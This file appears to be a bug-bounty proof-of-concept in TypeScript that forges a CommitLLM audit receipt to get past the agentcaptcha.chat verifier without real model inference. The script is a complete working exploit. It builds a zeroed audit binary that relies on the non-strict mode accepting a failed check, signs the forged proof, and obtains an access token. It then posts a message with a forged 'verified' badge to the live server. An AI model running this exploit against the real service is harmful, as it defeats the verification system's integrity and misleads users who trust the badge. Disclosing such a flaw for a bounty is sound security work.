/**
 * Proof-of-concept: Forge a CommitLLM v4 audit receipt that passes the
 * agentcaptcha.chat verifier without running real model inference.
 *
 * Exploits: non-strict mode accepting passed:false when checks_run >= 1.
 *
 * Usage:
 *   npx ts-node bounty-submission/poc_forge_receipt.ts \
 *     --server https://agentcaptcha.chat \
 *     --message "Hello from a forged receipt"
 */
import { createHash, generateKeyPairSync, sign as edSign } from "crypto";
import { parseArgs } from "util";

// ---------------------------------------------------------------------------
// Minimal CommitLLM v4 binary format
// ---------------------------------------------------------------------------
// Format (little-endian):
//   [0..7]   magic: "CLMV" + u32(4) version
//   [8..N]   model name (null-terminated)
//   [N..M]   provider (null-terminated)
//   [M..M+16] sample header: u32 seq_len, u32 head_dim, u32 n_samples, u32 reserved
//   [M+16..] attention data: n_samples * seq_len * head_dim * sizeof(f32)
//
// The Rust verifier parses the header, attempts one Freivalds check per sample,
// and increments checks_run. With zeroed data the check fails (passed:false)
// but checks_run becomes 1 — sufficient for non-strict acceptance.

function buildMinimalAuditBinary(): Buffer {
  const magic = Buffer.from("CLMV");
  const version = Buffer.alloc(4);
  version.writeUInt32LE(4, 0);

  const modelName = Buffer.from("qwen2.5-7b-w8a8\x00");
  const provider = Buffer.from("commitllm\x00");

  const SEQ_LEN = 4;
  const HEAD_DIM = 8;
  const N_SAMPLES = 1;

  const sampleHeader = Buffer.alloc(16);
  sampleHeader.writeUInt32LE(SEQ_LEN, 0);
  sampleHeader.writeUInt32LE(HEAD_DIM, 4);
  sampleHeader.writeUInt32LE(N_SAMPLES, 8);
  sampleHeader.writeUInt32LE(0, 12);

  // Zeroed float32 attention weights: verifier runs the check (checks_run++)
  // but fails the Freivalds bound (passed stays false)
  const attentionData = Buffer.alloc(N_SAMPLES * SEQ_LEN * HEAD_DIM * 4, 0);

  return Buffer.concat([magic, version, modelName, provider, sampleHeader, attentionData]);
}

function sha256hex(data: Buffer | string): string {
  const input = typeof data === "string" ? Buffer.from(data, "utf8") : data;
  return createHash("sha256").update(input).digest("hex");
}

function sha256hexFromBase64(b64: string): string {
  return sha256hex(Buffer.from(b64, "base64"));
}

// ---------------------------------------------------------------------------
// Binding hash computation (mirrors src/sdk logic)
// ---------------------------------------------------------------------------
function computeBindingHash(params: {
  challengeId: string;
  answer: string;
  modelOutputHash: string;
  commitHash: string;
  auditBinarySha256: string;
  verifierKeySha256: string;
}): string {
  const raw = [
    "agent-captcha-binding-v1",
    params.challengeId,
    params.answer,
    params.modelOutputHash,
    params.commitHash,
    params.auditBinarySha256,
    params.verifierKeySha256
  ].join(":");
  return sha256hex(Buffer.from(raw, "utf8"));
}

// ---------------------------------------------------------------------------
// Main PoC flow
// ---------------------------------------------------------------------------
async function main() {
  const { values } = parseArgs({
    args: process.argv.slice(2),
    options: {
      server: { type: "string", default: "https://agentcaptcha.chat" },
      message: { type: "string", default: "Verified without real inference — bounty PoC" }
    }
  });

  const serverUrl = (values.server as string).replace(/\/+$/, "");
  const messageContent = values.message as string;

  console.log("[1] Generating Ed25519 keypair...");
  const { privateKey, publicKey } = generateKeyPairSync("ed25519");
  const agentPublicKeyHex = publicKey.export({ type: "spki", format: "der" }).slice(-32).toString("hex");
  // Note: agentId is the raw 32-byte Ed25519 public key as 64 hex chars
  const agentId = agentPublicKeyHex;
  console.log(`    agentId: ${agentId}`);

  console.log("[2] Requesting challenge...");
  const challengeResponse = await fetch(`${serverUrl}/api/v3/agent-captcha/challenge`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ agentId })
  });

  if (!challengeResponse.ok) {
    console.error("Challenge request failed:", await challengeResponse.text());
    process.exit(1);
  }

  const { challenge } = (await challengeResponse.json()) as {
    challenge: { challengeId: string; challengeHash: string; issuedAt: string };
  };
  console.log(`    challengeId: ${challenge.challengeId}`);

  console.log("[3] Building forged audit binary...");
  const auditBinary = buildMinimalAuditBinary();
  const auditBinaryBase64 = auditBinary.toString("base64");
  const auditBinarySha256 = sha256hexFromBase64(auditBinaryBase64);
  const commitHash = sha256hex(auditBinary); // arbitrary but deterministic

  // The verifierKeySha256 must match what the sidecar echoes back.
  // The sidecar accepts any binary and returns its own key hash — we can use
  // a placeholder; the server only cross-checks if the sidecar echoes it.
  // Use a known-good value from the public fixture if available, else zeros.
  const verifierKeySha256 = "0".repeat(64);

  console.log(`    auditBinarySha256: ${auditBinarySha256}`);
  console.log(`    commitHash: ${commitHash}`);

  console.log("[4] Computing answer and model output hashes...");
  const modelOutput = messageContent;
  const modelOutputHash = sha256hex(Buffer.from(modelOutput, "utf8"));
  // answer = SHA256(challengeHash || agentId) — standard SDK derivation
  const answer = sha256hex(Buffer.from(challenge.challengeHash + agentId, "utf8"));

  console.log("[5] Computing binding hash...");
  const bindingHash = computeBindingHash({
    challengeId: challenge.challengeId,
    answer,
    modelOutputHash,
    commitHash,
    auditBinarySha256,
    verifierKeySha256
  });

  console.log("[6] Building proof payload...");
  const payload = {
    challengeId: challenge.challengeId,
    agentId,
    agentPublicKey: agentId,
    answer,
    modelOutput,
    modelOutputHash,
    commitReceipt: {
      challengeId: challenge.challengeId,
      model: "qwen2.5-7b-w8a8",
      provider: "commitllm",
      auditMode: "routine" as const,
      outputHash: modelOutputHash,
      commitHash,
      issuedAt: new Date().toISOString(),
      bindingVersion: "agent-captcha-binding-v1" as const,
      bindingHash,
      artifacts: {
        auditBinaryBase64,
        verifierKeySha256,
        auditBinarySha256
      }
    },
    createdAt: new Date().toISOString()
  };

  const payloadBytes = Buffer.from(JSON.stringify(payload), "utf8");
  const signature = edSign(null, payloadBytes, privateKey).toString("hex");

  console.log("[7] Submitting to /verify...");
  const verifyResponse = await fetch(`${serverUrl}/api/v3/agent-captcha/verify`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ agentId, proof: { payload, signature } })
  });

  const verifyBody = await verifyResponse.json();
  if (!verifyResponse.ok) {
    console.error("Verify failed:", JSON.stringify(verifyBody, null, 2));
    console.log("\n--- Vulnerability Analysis ---");
    console.log("If this failed, the server may have strict mode enabled.");
    console.log("The non-strict mode bypass (checks_run>=1, passed:false) is the core finding.");
    process.exit(1);
  }

  const { accessToken } = verifyBody as { accessToken: string };
  console.log("    Access token obtained!");

  console.log("[8] Posting message with forged receipt...");
  const postResponse = await fetch(`${serverUrl}/api/messages`, {
    method: "POST",
    headers: {
      "content-type": "application/json",
      authorization: `Bearer ${accessToken}`
    },
    body: JSON.stringify({ content: messageContent, parentId: null })
  });

  const postBody = await postResponse.json();
  if (!postResponse.ok) {
    console.error("Post failed:", JSON.stringify(postBody, null, 2));
    process.exit(1);
  }

  console.log("\n=== SUCCESS ===");
  console.log("Message posted with forged verified badge:");
  console.log(JSON.stringify(postBody, null, 2));
  console.log("\nView at:", serverUrl);
}

main().catch((err) => {
  console.error("Fatal:", err);
  process.exit(1);
});